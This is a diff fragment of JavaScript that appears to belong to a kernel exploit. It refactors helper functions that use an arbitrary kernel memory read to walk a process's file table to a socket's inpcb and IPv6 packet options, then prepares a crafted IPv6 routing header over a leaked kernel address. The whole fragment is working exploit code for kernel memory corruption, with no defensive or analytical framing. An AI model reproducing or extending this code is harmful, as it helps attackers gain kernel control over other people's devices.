@@ -1221,19 +1221,16 @@ function get_fd_data_addr(sock) {
  
 */
     
-function get_fd_data_addr(sock) {
-  
-  const idx = sock;
-  const filep = kmem.read64(ofiles.add(idx * SIZEOF_OFILES));
-  return kmem.read64(filep);
+function get_fd_data_addr(fd) {
+   const filep = kmem.read64(ofiles.add(fd * SIZEOF_OFILES));  // Addr
+  return kmem.read64(filep);  // struct socket*
 }
 
-function get_sock_pktopts(sock) {
-  const sock_data = get_fd_data_addr(sock);
-  const pcb = kmem.read64(sock_data.add(SO_PCB));
-  return kmem.read64(pcb.add(INPCB_PKTOPTS));
+function get_sock_pktopts(fd) {
+  const so = get_fd_data_addr(fd);  // struct socket*
+  const pcb = kmem.read64(so.add(SO_PCB)); // struct inpcb*
+  return kmem.read64(pcb.add(INPCB_PKTOPTS)); // struct ip6_pktopts*
 }
-
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
